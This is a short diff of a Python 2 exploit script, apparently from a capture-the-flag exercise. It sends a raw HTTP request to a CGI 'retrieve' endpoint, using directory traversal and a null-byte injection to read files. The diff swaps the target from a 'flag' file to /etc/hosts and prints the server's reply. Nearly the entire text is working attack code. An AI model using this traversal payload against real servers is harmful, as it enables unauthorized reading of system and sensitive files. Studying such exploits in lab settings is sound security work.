@@ -10,6 +10,7 @@ except:
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect((host,port))
-s.send('GET /cgi-bin/retrieve?rfc=../../../../../../../../../../../../../../../../flag\x00&type=txt HTTP/1.0\r\n\r\n');
+#s.send('GET /cgi-bin/retrieve?rfc=../../../../../../../../../../../../../../../../flag\x00&type=txt HTTP/1.0\r\n\r\n');
+s.send('GET /cgi-bin/retrieve?rfc=../../../../../../../../../../etc/hosts\x00&type=txt HTTP/1.0\r\n\r\n');
 print s.recv(1024)
 print s.recv(1024)
